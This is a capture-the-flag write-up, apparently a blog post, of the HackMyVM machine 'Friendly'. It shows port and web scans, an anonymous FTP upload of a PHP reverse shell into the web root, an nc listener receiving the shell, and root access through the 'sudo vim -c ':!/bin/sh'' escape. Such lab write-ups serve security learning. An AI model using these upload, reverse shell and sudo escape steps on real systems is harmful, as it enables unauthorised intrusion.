---
layout: post
title: "HackMyVM - Friendly"
date: 2023-03-24 15:47:00 +0100
categories: hmv
---

Creator: [RiJaba1](https://hackmyvm.eu/profile/?user=RiJaba1)
Level: Easy
Release Date: 2023-03-24

## Scan

```bash
$ nmap -sC -sV -oA scans/Friendly -p- 192.168.1.13
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-24 18:10 WET
Nmap scan report for 192.168.1.13
Host is up (0.0023s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--   1 root     root        10725 Feb 23 15:26 index.html
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.54 (Debian)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.04 seconds
```

## Enumeration 

```bash
$ nikto -h http://192.168.1.13/ -C all -output scans/nikto-192.168.1.13.html -Format HTML
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.1.13
+ Target Hostname:    192.168.1.13
+ Target Port:        80
+ Start Time:         2023-03-24 18:43:15 (GMT0)
---------------------------------------------------------------------------
+ Server: Apache/2.4.54 (Debian)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /: Server may leak inodes via ETags, header found with file /, inode: 29e5, size: 5f55fa2250a77, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ OPTIONS: Allowed HTTP Methods: GET, POST, OPTIONS, HEAD .
+ 26640 requests: 0 error(s) and 4 item(s) reported on remote host
+ End Time:           2023-03-24 18:44:23 (GMT0) (68 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

### Gobuster

```bash
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.1.13 -x php,html,txt -o scans/gobuster-medium.log
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.13
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              html,txt,php
[+] Timeout:                 10s
===============================================================
2023/03/24 18:41:25 Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 277]
/index.html           (Status: 200) [Size: 10725]
/.html                (Status: 403) [Size: 277]
/.php                 (Status: 403) [Size: 277]
/.html                (Status: 403) [Size: 277]
/server-status        (Status: 403) [Size: 277]
Progress: 881634 / 882244 (99.93%)
===============================================================
2023/03/24 18:45:13 Finished
===============================================================
```

## Reverse Shell 

```bash
$ ftp 192.168.1.13                                   
Connected to 192.168.1.13.
220 ProFTPD Server (friendly) [::ffff:192.168.1.13]
Name (192.168.1.13:adok): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: 
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> put rshell.php 
local: rshell.php remote: rshell.php
229 Entering Extended Passive Mode (|||59621|)
150 Opening BINARY mode data connection for rshell.php
100% |**************************************************************************************************************************|  5493       28.31 MiB/s    00:00 ETA
226 Transfer complete
5493 bytes sent in 00:00 (2.73 MiB/s)
ftp> bye
221 Goodbye.

$ nc -lvnp 4444             
listening on [any] 4444 ...
connect to [192.168.1.6] from (UNKNOWN) [192.168.1.13] 37532
Linux friendly 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64 GNU/Linux
 15:44:55 up  1:40,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```

## ROOT

```
sudo vim -c ':!/bin/sh'
```

```bash
:!/bin/sh
id
uid=0(root) gid=0(root) groups=0(root)
cd /root
ls
interfaces.sh
root.txt
cat root.txt
Not yet! Find root.txt.
```

```bash
root@friendly:~# find / -name *root.txt* -print
/var/log/apache2/root.txt
/root/root.txt
```